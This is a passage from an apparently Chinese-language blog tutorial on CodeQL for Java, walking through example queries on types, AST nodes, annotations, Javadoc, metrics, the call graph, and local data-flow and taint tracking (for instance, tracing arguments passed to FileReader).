href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/type.Statement$IfStmt.html">IfStmt<i class="fas fa-external-link-alt"></i></a>：<code>if</code>语句<br>  <a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/type.Statement$BlockStmt.html">BlockStmt<i class="fas fa-external-link-alt"></i></a>：语句块</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where ifstmt.getThen() = blockstmt and blockstmt.getNumStmt() = 0  </span><br></pre></td></tr></table></figure><p>定义变量的条件，<code>ifstmt.getThen() = blockstmt</code> 将这两个变量联系起来。<code>blockstmt</code> 必须是 <code>if</code> 语句的 <code>then</code> 分支。<br><code>blockstmt.getNumStmt() = 0</code> 声明该块必须为空（即不包含任何语句）<br><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$IfStmt$getThen.0.html">IfStmt::getThen<i class="fas fa-external-link-alt"></i></a>：<code>Stmt getThen()</code>，成员谓词，获取此 <code>if</code> 语句的 <code>then</code> 分支<br><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$BlockStmt$getNumStmt.0.html">BlockStmt::getNumStmt<i class="fas fa-external-link-alt"></i></a>：<code>int getNumStmt()</code>，成员谓词，获取此块中直接子语句的数目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ifstmt, “This ‘if’ statement is redundant.”  </span><br></pre></td></tr></table></figure><p>定义每个匹配项的报告内容，<code>select</code> 用于查找不良编码实例的查询语句始终采用以下形式： <code>select &lt;program element&gt;, &quot;&lt;alert message&gt;&quot;</code></p><p>浏览查询结果可能会发现带有<code>else</code>分支的<code>if</code>语句的例子，其中空的<code>then</code>分支确实起到了作用。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) &#123;  </span><br><span class="line">  ...  </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;-verbose&quot;</span>.equals(option)) &#123;  </span><br><span class="line">  <span class="comment">// nothing to do - handled earlier  </span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">  error(<span class="string">&quot;unrecognized option&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行 CodeQL 的查询结果如图</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/codeQLQueryIF.png" class><p>在这种情况下，将带有空 <code>then</code> 分支的 <code>if</code> 语句识别为多余的是错误的。一种解决方案是如果 <code>if</code> 语句有 <code>else</code> 分支，则忽略空的 <code>then</code> 分支：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from IfStmt ifstmt, BlockStmt blockstmt  </span><br><span class="line">where ifstmt.getThen() = blockstmt and  </span><br><span class="line">blockstmt.getNumStmt() = 0 and  </span><br><span class="line">not exists(ifstmt.getElse())  </span><br><span class="line">select ifstmt, &quot;This &#x27;if&#x27; statement is redundant.&quot;</span><br></pre></td></tr></table></figure><p><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Statement.qll/predicate.Statement$IfStmt$getElse.0.html">IfStmt::getElse<i class="fas fa-external-link-alt"></i></a>：<code>Stmt getElse()</code>，成员谓词，获取此<code>if</code>语句的<code>else</code>分支</p><h3 id="CodeQL-的-Java-库"><a href="#CodeQL-的-Java-库" class="headerlink" title="CodeQL 的 Java 库"></a>CodeQL 的 Java 库</h3><p>标准 Java 库中最重要的类可以分为以下五个类别</p><p>1、表示程序元素的类（例如 Java 的类和方法）<br>2、表示 AST 节点的类（例如语句和表达式）<br>3、表示元数据的类（例如注释和注解）<br>4、计算度量的类（例如圈复杂度和耦合度）<br>5、导航程序调用图的类</p><h4 id="程序元素"><a href="#程序元素" class="headerlink" title="程序元素"></a>程序元素</h4><p>包括包（<code>Package</code>）、编译单元（<code>CompilationUnit</code>）、类型（<code>Type</code>）、方法（<code>Method</code>）、构造函数（<code>Constructor</code>）和变量（<code>Variable</code>）<br>它们的共同超类是<code>Element</code>，它提供了通用的成员谓词，用于确定程序元素的名称和检查两个元素是否相互嵌套</p><p><code>Callable</code> 是 <code>Method</code> 和<code>Constructor</code>的共同超类，通过 <code>Callable</code> 引用一个可能是方法或构造函数的元素通常很方便</p><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p><code>Type</code> 类有许多子类用于表示不同类型：</p><ul><li><code>PrimitiveType</code> 表示一个 <a class="link" href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html">基本类型<i class="fas fa-external-link-alt"></i></a>，即 <code>boolean</code>, <code>byte</code>, <code>char</code>, <code>double</code>, <code>float</code>, <code>int</code>, <code>long</code>, <code>short</code> 之一， QL 也将 <code>void</code> 和 <code>&lt;nulltype&gt;</code> 归为基本类型</li><li><code>RefType</code>表示引用类型，包含如下子类：<ul><li><code>Class</code> Java 类</li><li><code>Interface</code> Java 接口</li><li><code>EnumType</code> Java 枚举类型</li><li><code>Array</code> Java 数组类型</li></ul></li></ul><p>例如，以下查询查找程序中为 int 类型的所有变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Variable v, PrimitiveType pt  </span><br><span class="line">where pt = v.getType() and   </span><br><span class="line">    pt.hasName(&quot;int&quot;)  </span><br><span class="line">select v</span><br></pre></td></tr></table></figure><p><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Variable.qll/predicate.Variable$Variable$getType.0.html">Variable::getType<i class="fas fa-external-link-alt"></i></a>：<code>Type getType()</code>，获取变量的类型<br><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Element.qll/predicate.Element$Element$hasName.1.html">Element::hasName<i class="fas fa-external-link-alt"></i></a>：<code>predicate hasName(string name)</code>，如果元素具有指定的名称则该谓词成立</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/findInt.png" class><p>引用类型也根据其声明范围进行分类：</p><ul><li><code>TopLevelType</code> 表示在编译单元的顶层声明的引用类型</li><li><code>NestedType</code> 是在另一个类型中声明的类型</li></ul><p>例如，此查询查找名称与其编译单元名称不同的所有顶级类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from TopLevelType tl  </span><br><span class="line">where tl.getName() != tl.getCompilationUnit().getName()  </span><br><span class="line">select tl</span><br></pre></td></tr></table></figure><p><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Element.qll/predicate.Element$Element$getName.0.html">Element::getName<i class="fas fa-external-link-alt"></i></a>：<code>string getName()</code>，获取元素的名称<br><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/predicate.Type$RefType$getCompilationUnit.0.html">RefType::getCompilationUnit<i class="fas fa-external-link-alt"></i></a>：<code>CompilationUnit getCompilationUnit()</code>，获取声明此类型的编译单元<br><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/CompilationUnit.qll/predicate.CompilationUnit$CompilationUnit$getName.0.html">CompilationUnit::getName<i class="fas fa-external-link-alt"></i></a>：<code>string getName()</code>，获取编译单元的名称（不包括其扩展名）</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/findTL.png" class><p>还有几个专用的类：</p><ul><li><code>TopLevelClass</code> 表示在编译单元的顶层声明的类</li><li><code>NestedClass</code> 表示在<a class="link" href="https://docs.oracle.com/javase/tutorial/java/javaOO/nested.html">另一个类型内声明的类<i class="fas fa-external-link-alt"></i></a>，如<ul><li><code>LocalClass</code>， <a class="link" href="https://docs.oracle.com/javase/tutorial/java/javaOO/localclasses.html">是在方法或构造函数中声明的类<i class="fas fa-external-link-alt"></i></a>.</li><li><code>AnonymousClass</code>， <a class="link" href="https://docs.oracle.com/javase/tutorial/java/javaOO/anonymousclasses.html">匿名类<i class="fas fa-external-link-alt"></i></a></li></ul></li></ul><p>最后，该库还有许多封装了常用的 Java 标准库类的单例类：</p><p><code>TypeObject</code>、<code>TypeCloneable</code>、<code>TypeRuntime</code>、<code>TypeSerializable</code>、<code>TypeString</code>、<code>TypeSystem</code> 和 <code>TypeClass</code></p><p>例如，我们可以编写一个查询，查找直接继承 <code>Object</code> 的所有嵌套类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from NestedClass nc  </span><br><span class="line">where nc.getASupertype() instanceof TypeObject  </span><br><span class="line">select nc</span><br></pre></td></tr></table></figure><p><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/predicate.Type$RefType$getASupertype.0.html">RefType::getASupertype<i class="fas fa-external-link-alt"></i></a>：<code>RefType getASupertype()</code>，获取此类型的直接超类</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/findExtendsObj.png" class><h5 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h5><p><code>Type</code> 还有几个子类用于处理泛型类型<br><code>GenericType</code> 代表 <code>GenericInterface</code> 或 <code>GenericClass</code>，它表示一个泛型类型声明，比如 <code>java.util.Map</code> 接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package java.util.;  </span><br><span class="line">  </span><br><span class="line">public interface Map&lt;K, V&gt; &#123;  </span><br><span class="line">    int size();  </span><br><span class="line">  </span><br><span class="line">    // ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类型参数，如本例中的 <code>K</code> 和 <code>V</code>，由类 <code>TypeVariable</code> 表示</p><p>泛型类型的参数化实例提供了一个具体类型来实例化类型参数，如 <code>Map&lt;String, File&gt;</code> 中所示。这样的类型由 <code>ParameterizedType</code> 表示，它不同于表示其实例化来源的泛型类型 <code>GenericType</code>。要从 <code>ParameteredType</code> 转换为相应的 <code>GenericType</code>，可以使用谓词 <code>getSourceDeclaration</code>。</p><p>例如，我们可以使用下面的查询来查找所有 <code>java.util.Map</code> 的参数化实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from GenericInterface map, ParameterizedType pt  </span><br><span class="line">where map.hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;)   </span><br><span class="line">    and pt.getSourceDeclaration() = map  </span><br><span class="line">select pt</span><br></pre></td></tr></table></figure><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/findMap.png" class><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><p>类 <code>Variable</code> 表示 <a class="link" href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/variables.html">Java意义上<i class="fas fa-external-link-alt"></i></a> 的变量，它要么是类的成员字段（无论是静态的还是非静态的），要么是局部变量，要么是参数。所以针对这些特殊情况，有三个子类：</p><ul><li><code>Field</code> 表示一个Java字段</li><li><code>LocalVariableDecl</code> 表示局部变量</li><li><code>Parameter</code> 表示方法或构造函数的参数</li></ul><h4 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h4><p>此类别中的类表示抽象语法树（AST）节点，即语句（类<code>Stmt</code>）和表达式（类<code>Expr</code>）。有关标准QL库中可用的表达式和语句类型的完整列表，见<a class="link" href="https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E7%94%A8%E4%BA%8E%E5%A4%84%E7%90%86Java%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91%E7%B1%BB">用于处理Java程序的抽象语法树类<i class="fas fa-external-link-alt"></i></a></p><p><code>Expr</code>和<code>Stmt</code>都提供了成员谓词，用于探索程序的抽象语法树：</p><ul><li><code>Expr.getAChildExpr</code> 返回给定表达式的子表达式</li><li><code>Stmt.getAChild</code> 返回直接嵌套在给定语句中的语句或表达式</li><li><code>Expr.getParent</code> 和 <code>Stmt.getParent</code> 返回AST节点的父节点</li></ul><p>例如，以下查询将查找所有父级为<code>return</code>语句的表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Expr e  </span><br><span class="line">where e.getParent() instanceof ReturnStmt  </span><br><span class="line">select e</span><br></pre></td></tr></table></figure><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/return.png" class><p>以下查询查找父级为 <code>if</code> 语句的语句（将查找程序中所有 <code>if</code> 语句的 <code>then</code> 分支和 <code>else</code> 分支）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Stmt s  </span><br><span class="line">where s.getParent() instanceof IfStmt  </span><br><span class="line">select s</span><br></pre></td></tr></table></figure><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/ifElse.png" class><p>最后，这是一个查找方法体的查询：</p><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/structureSearch.png" class><p>正如这些示例所示，表达式的父节点并不总是表达式：它也可能是语句，例如 <code>IfStmt</code>。类似地，语句的父节点并不总是一个语句：它也可能是一个方法或构造函数。为了解决这个问题，QL Java 库提供了两个抽象类 <code>ExprParent</code> 和 <code>StmtParent</code>，前者表示可能是表达式父节点的任何节点，后者表示可能是语句父节点的任何节点</p><p>有关使用 AST 类的更多信息，见 <a class="link" href="https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#Java%E4%B8%AD%E5%AE%B9%E6%98%93%E6%BA%A2%E5%87%BA%E7%9A%84%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97">Java中容易溢出的比较运算<i class="fas fa-external-link-alt"></i></a></p><h4 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h4><p>除了程序代码之外，Java 程序还有几种元数据。特别是有<a class="link" href="https://docs.oracle.com/javase/tutorial/java/annotations/">注解<i class="fas fa-external-link-alt"></i></a>和<a class="link" href="https://en.wikipedia.org/wiki/Javadoc">Javadoc<i class="fas fa-external-link-alt"></i></a>注释。由于此元数据对于增强代码分析和作为分析主题本身都很有趣，因此 QL 库定义了用于访问它的类</p><p>对于注解，类 <code>Annotatable</code> 是所有可注解的程序元素的超类。包括包、引用类型、字段、方法、构造函数和局部变量声明。对于每一个这样的元素，其谓词 <code>getAnAnnotation</code> 能检索该元素可能具有的任何注解。例如，以下查询查找构造函数上的所有注解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Constructor c  </span><br><span class="line">select c.getAnAnnotation()</span><br></pre></td></tr></table></figure><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/getAnnotations.png" class><p>这些注解由类 <code>Annotation</code> 表示。注解只是类型为 <code>AnnotationType</code> 的表达式。例如，可以修改此查询，使其只报告 <code>Deprecated</code> 的构造函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Constructor c, Annotation ann, AnnotationType anntp  </span><br><span class="line">where ann = c.getAnAnnotation() and  </span><br><span class="line">    anntp = ann.getType() and  </span><br><span class="line">    anntp.hasQualifiedName(&quot;java.lang&quot;, &quot;Deprecated&quot;)  </span><br><span class="line">select ann</span><br></pre></td></tr></table></figure><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/Deprecated.png" class><p>有关使用注解的更多信息，见本文 Java 中的注解</p><p>对于 Javadoc，类 <code>Element</code> 有一个成员谓词 <code>getDoc</code>，它返回一个委派的 <code>Documentable</code> 的对象，然后可以查询它附加的 Javadoc 注释。例如，以下查询在私有字段上查找 Javadoc 注释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Field f, Javadoc jdoc</span><br><span class="line">where f.isPrivate() and</span><br><span class="line">    jdoc = f.getDoc().getJavadoc()</span><br><span class="line">select jdoc</span><br></pre></td></tr></table></figure><p>类 <code>Javadoc</code> 将整个 Javadoc 注释表示为 <code>JavadocElement</code> 节点树，可以使用成员谓词 <code>getAChild</code> 和 <code>getParent</code> 遍历这些节点。例如，你可以编辑查询，以便在私有字段的 Javadoc 注释中找到所有 <code>@author</code> 标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Field f, Javadoc jdoc, AuthorTag at  </span><br><span class="line">where f.isPrivate() and  </span><br><span class="line">    jdoc = f.getDoc().getJavadoc() and  </span><br><span class="line">    at.getParent+() = jdoc  </span><br><span class="line">select at</span><br></pre></td></tr></table></figure><blockquote><p><a class="link" href="https://codeql.github.com/docs/ql-language-reference/recursion/">Recursion — CodeQL<i class="fas fa-external-link-alt"></i></a></p></blockquote><p>有关使用 Javadoc 的更多信息，见 Javadoc</p><h4 id="度量"><a href="#度量" class="headerlink" title="度量"></a>度量</h4><p>标准的 QL Java 库为计算 Java 程序元素的度量提供了广泛的支持。为了避免与度量计算相关的成员谓词过多而给代表这些元素的类造成过重的负担，这些谓词被放在委托类上</p><p>总共有六个这样的类：<code>MetricElement</code>、<code>MetricPackage</code>、<code>MetricRefType</code>、<code>MetricField</code>、<code>MetricCallable</code> 和 <code>MetricStmt</code>。相应的元素类各自提供一个成员谓词 <code>getMetrics</code>，可用于获取委托类的实例，然后在这个实例上进行度量计算。例如，以下查询查找 <a class="link" href="https://en.wikipedia.org/wiki/Cyclomatic_complexity">圈复杂度<i class="fas fa-external-link-alt"></i></a>大于 5 的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Method m, MetricCallable mc</span><br><span class="line">where mc = m.getMetrics() and</span><br><span class="line">    mc.getCyclomaticComplexity() &gt; 5</span><br><span class="line">select m</span><br></pre></td></tr></table></figure><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/complexlity.png" class><h4 id="调用图"><a href="#调用图" class="headerlink" title="调用图"></a>调用图</h4><p>从 Java 代码生成的 CodeQL 数据库包含有关程序调用图的预计算信息，即给定调用在运行时可以分派给哪些方法或构造函数。</p><p>前文介绍的 <code>Callable</code> 类，它包括方法，也包括构造函数。调用表达式是使用类<code>Call</code>来进行抽象的，它包括方法调用、<code>new</code> 表达式和使用 <code>this</code> 或 <code>super</code> 的显式构造函数调用</p><p>我们可以使用谓词 <code>Call.getCallee</code> 来查找一个特定的调用表达式所指向的方法或构造函数。例如，以下查询查找名为 <code>println</code> 的方法的所有调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Call c, Method m  </span><br><span class="line">where m = c.getCallee() and  </span><br><span class="line">    m.hasName(&quot;println&quot;)  </span><br><span class="line">select c</span><br></pre></td></tr></table></figure><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/println.png" class><p>相反， <code>Callable.getAReference</code> 返回指向它的 <code>Call</code> 。所以我们可以使用这个查询找到从未被调用的方法或构造函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Callable c</span><br><span class="line">where not exists(c.getAReference())</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><img src="/2023/07/31/CodeQL-%E5%AD%A6%E4%B9%A0/getAReference.png" class><p>有关可调用项和调用的更多信息，见导航调用图</p><h2 id="0x05-Java-中的数据流分析"><a href="#0x05-Java-中的数据流分析" class="headerlink" title="0x05 Java 中的数据流分析"></a>0x05 Java 中的数据流分析</h2><p>数据流分析用于计算一个变量在程序中各个点上可能保持的值，确定这些值如何在程序中传播以及它们的使用位置</p><h3 id="局部数据流"><a href="#局部数据流" class="headerlink" title="局部数据流"></a>局部数据流</h3><p>局部数据流是单个方法内或可调用内的数据流。局部数据流通常比全局数据流更容易、更快、更精确，并且对于许多查询来说已经足够了</p><h4 id="使用局部数据流"><a href="#使用局部数据流" class="headerlink" title="使用局部数据流"></a>使用局部数据流</h4><p>局部数据流库位于 <code>DataFlow</code> 模块中，该模块定义了类 <code>Node</code> 来表示数据可以通过的任意元素。<code>Node</code> 分为表达式节点（<code>ExprNode</code>）和参数节点（<code>ParameterNode</code>）。可以使用成员谓词 <code>asExpr</code> 和 <code>asParameter</code> 在数据流节点和表达式&#x2F;参数之间映射：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Node &#123;  </span><br><span class="line">  /** Gets the expression corresponding to this node, if any. */  </span><br><span class="line">  Expr asExpr() &#123; ... &#125;  </span><br><span class="line">  </span><br><span class="line">  /** Gets the parameter corresponding to this node, if any. */  </span><br><span class="line">  Parameter asParameter() &#123; ... &#125;  </span><br><span class="line">  </span><br><span class="line">  ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者使用谓词 <code>exprNode</code> 和 <code>parameterNode</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**  </span><br><span class="line"> * Gets the node corresponding to expression `e`.  </span><br><span class="line"> */  </span><br><span class="line">ExprNode exprNode(Expr e) &#123; ... &#125;  </span><br><span class="line">  </span><br><span class="line">/**  </span><br><span class="line"> * Gets the node corresponding to the value of parameter `p` at function entry.  </span><br><span class="line"> */  </span><br><span class="line">ParameterNode parameterNode(Parameter p) &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>如果存在一条从节点 <code>nodeFrom</code> 到节点 <code>nodeTo</code> 的实时数据流边，则谓词 <code>localFlowStep(Node nodeFrom, Node nodeTo)</code> 成立。可以通过使用<code>+</code>或<code>*</code>运算符来递归地应用 <code>localFlowStep</code>，或者通过使用预定义的递归谓词 <code>localFlow</code>（相当于 <code>localFlowStep*</code>）</p><p>例如，可以在零个或多个局部步骤中找到从参数 <code>source</code> 到表达式 <code>sink</code> 的流：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure><h4 id="使用局部污点跟踪"><a href="#使用局部污点跟踪" class="headerlink" title="使用局部污点跟踪"></a>使用局部污点跟踪</h4><p>局部污点跟踪通过包含非保值流步骤来扩展局部数据流。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String temp = x;  </span><br><span class="line">String y = temp + &quot;, &quot; + temp;</span><br></pre></td></tr></table></figure><p>如果 <code>x</code> 是污点字符串，那么 <code>y</code> 也是污点</p><p>局部污点跟踪库位于 <code>TaintTracking</code> 模块中。与局部数据流一样，如果存在一条从节点 <code>nodeFrom</code> 到节点 <code>nodeTo</code> 的实时污染传播边，则谓词 <code>localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo)</code> 成立。可以使用 <code>+</code> 和 <code>*</code> 运算符递归地应用谓词，或者使用预定义的递归谓词 <code>localTaint</code>（相当于 <code>localTaintStep*</code>）</p><p>例如，可以在零个或多个局部步骤中找到从参数 <code>source</code> 到表达式 <code>sink</code> 的污染传播：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>此查询查找传递给新 <code>new FileReader(..)</code> 的文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java  </span><br><span class="line">  </span><br><span class="line">from Constructor fileReader, Call call  </span><br><span class="line">where  </span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and  </span><br><span class="line">  call.getCallee() = fileReader  </span><br><span class="line">select call.getArgument(0)</span><br></pre></td></tr></table></figure><p><a class="link" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/predicate.Member$Member$getDeclaringType.0.html">Member::getDeclaringType<i class="fas fa-external-link-alt"></i></a>：<code>RefType getDeclaringType()</code>，获取定义此成员的类型</p><p>但这只给出参数中的表达式，而不是可以传递给它的值。所以我们使用局部数据流来查找流入参数的所有表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Constructor fileReader, Call call, Expr src</span><br><span class="line">where</span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and</span><br><span class="line">  call.getCallee() = fileReader and</span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select src</span><br></pre></td></tr></table></figure><p>然后我们可以使源更加具体，例如对一个公共参数的访问。此查询查找将公共参数传递给 <code>new FileReader(..)</code> 的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Constructor fileReader, Call call, Parameter p</span><br><span class="line">where</span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and</span><br><span class="line">  call.getCallee() = fileReader and</span><br><span class="line">  DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select p</span><br></pre></td></tr></table></figure><p>此查询查找对格式字符串没有硬编码的格式化函数的调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 